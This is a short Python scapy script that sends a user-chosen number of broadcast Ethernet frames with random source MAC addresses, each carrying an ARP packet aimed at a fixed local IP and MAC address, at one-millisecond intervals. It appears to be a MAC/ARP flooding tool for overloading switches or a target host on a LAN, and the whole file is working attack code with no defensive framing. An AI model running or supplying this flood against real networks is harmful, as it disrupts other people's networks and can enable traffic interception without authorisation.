from scapy.all import *

num = int(raw_input("Enter the number of packets - "))
interface = raw_input("Enter the interface - ")

eth_pkt = Ether(src = RandMAC(),dst="ff:ff:ff:ff:ff:ff")

arp_pkt = ARP(pdst = "192.168.2.10",hwdst="d4:3d:7e:9a:e0:37")

try:
	sendp(eth_pkt/arp_pkt,iface=interface,count=num,inter=.001)
except:
	print("Destination unreachable")





